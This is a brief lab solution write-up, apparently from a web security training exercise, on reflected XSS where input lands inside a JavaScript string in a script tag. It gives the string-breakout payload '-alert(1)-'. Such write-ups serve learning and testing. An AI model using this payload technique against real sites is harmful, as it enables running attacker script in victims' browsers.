# Reflected XSS into a JavaScript string with angle brackets HTML encoded
Solution:
- Our input is reflected on a \<script> tag
```html
<script>
var searchTerms = 'xplo1t';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- Use the following payload `'-alert(1)-'`